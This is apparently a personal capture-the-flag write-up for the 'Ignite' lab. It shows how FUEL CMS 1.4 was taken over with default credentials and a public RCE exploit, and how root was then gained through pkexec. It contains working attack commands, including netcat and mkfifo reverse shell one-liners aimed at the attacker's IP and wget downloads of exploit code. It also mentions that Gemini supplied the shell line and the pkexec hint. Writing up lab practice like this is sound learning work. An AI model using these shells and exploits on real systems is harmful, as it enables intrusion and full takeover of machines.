---
title: Ignite Writeup
---

Add the target to `/etc/hosts`:
![[Pasted image 20260527175840.png]]

Run `Nmap`:
```bash
sudo nmap -sS -sV 10.48.156.10
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
Only one port is open? That's weird.

Let's visit the web first:
![[Pasted image 20260527180001.png]]
Below is the info I got from this page (at least, if you could extract more, that's even better):
```text
- The admin is using FUEL CMS version 1.4.
- http://ignite.thm/fuel --> login form.
- default credentials works
```

I'm visiting the login form and using the default credentials:
![[Pasted image 20260527180447.png]]

I did not play around with it much, but I tested then saw the file upload didn't accept `.php`.
![[Pasted image 20260527180645.png]]

I left it there, and used `searchsploit` to see what we could have:
![[Pasted image 20260527180836.png]]

I got a handy result. I played around with each of those and only `php/webapps/50477.py` uses python3 which is what I have on my machine, so I download it:
```bash
searchsploit -m php/webapps/50477.py
```

Read the payload to see the manual usage:
```bash
less 50477.py
```
![[Pasted image 20260527181134.png]]

Let's run it:
```bash
python3 50477.py -u http://ignite.thm
```
![[Pasted image 20260527181236.png]]

Got the shell, but something was wrong. I couldn't `cd` in or out as the shell kick me back to where I was standing even a `netcat` shell doesn't stand:
```bash
Enter Command $nc 192.168.134.218 4444 -e sh
system
```

Gemini told me to try this and it worked:
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.134.218 4444 > /tmp/f
```
![[Pasted image 20260527181653.png]]

Run `nc -vlnp 4444` on our attacking machine first, gave us the shell:
![[Pasted image 20260527181848.png]]
I ran `python3 -c 'import pty; pty.spawn("/bin/bash")'` to spawn a proper shell and we are in as the user with the `user.txt` flag at `/home/www-data/`.

I searched for `SUID` binaries and `writable` directory, but couldn't find a way in that kept me in a rabbit hole for almost an hour.
![[Pasted image 20260527182504.png]]
I tried doing what I usually do with these three - `read each's permission --> strings out each one --> export /tmp to $PATH --> custom script at /tmp` no luck.
I tried running with the known vulnerability with the version `Ubuntu 16.04`, still no luck.

I decided to ask Gemini for hint, and it said `pkexec` is the best target so I tried finding an exploit which exists:
![[Pasted image 20260527182928.png]]

Clone the repo to our attacking machine, run a `HTTP` server with `python3` so we can download it from the shell:
```bash
python3 -m http.server 5656
```
```bash
www-data@ubuntu:/tmp$ wget "http://192.168.134.218:5656/evil-so.c"
wget "http://192.168.134.218:5656/evil-so.c"
--2026-05-26 23:01:57--  http://192.168.134.218:5656/evil-so.c
Connecting to 192.168.134.218:5656... connected.
HTTP request sent, awaiting response... 200 OK
Length: 183 [text/x-csrc]
Saving to: 'evil-so.c'

evil-so.c           100%[===================>]     183  --.-KB/s    in 0s

2026-05-26 23:01:57 (32.0 MB/s) - 'evil-so.c' saved [183/183]

www-data@ubuntu:/tmp$ wget "http://192.168.134.218:5656/exploit.c"
wget "http://192.168.134.218:5656/exploit.c"
--2026-05-26 23:02:12--  http://192.168.134.218:5656/exploit.c
Connecting to 192.168.134.218:5656... connected.
HTTP request sent, awaiting response... 200 OK
Length: 614 [text/x-csrc]
Saving to: 'exploit.c'

exploit.c           100%[===================>]     614  --.-KB/s    in 0.004s

2026-05-26 23:02:12 (170 KB/s) - 'exploit.c' saved [614/614]
```

Compile both of the files:
```bash
www-data@ubuntu:/tmp$ gcc -shared -o evil.so -fPIC evil-so.c
gcc -shared -o evil.so -fPIC evil-so.c
evil-so.c: In function 'gconv_init':
evil-so.c:10:5: warning: implicit declaration of function 'setgroups' [-Wimplicit-function-declaration]
     setgroups(0);
     ^
evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull]
     execve("/bin/sh", NULL, NULL);

www-data@ubuntu:/tmp$ gcc exploit.c -o exploit
gcc exploit.c -o exploit
exploit.c: In function 'main':
exploit.c:25:5: warning: implicit declaration of function 'execve' [-Wimplicit-function-declaration]
     execve(BIN, argv, envp);
```

Give it permission to execute:
```bash
www-data@ubuntu:/tmp$ chmod 777 evil.so
www-data@ubuntu:/tmp$ chmod 777 exploit
```

Final check on `/usr/bin/pkexec`:
```bash
www-data@ubuntu:/tmp$ ls -la /usr/bin/pkexec
ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
```

Don't forget to add `/tmp` to `$PATH`:
```bash
export PATH=/tmp:$PATH
```

Exploit:
```bash
www-data@ubuntu:/tmp$ ./exploit
./exploit
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
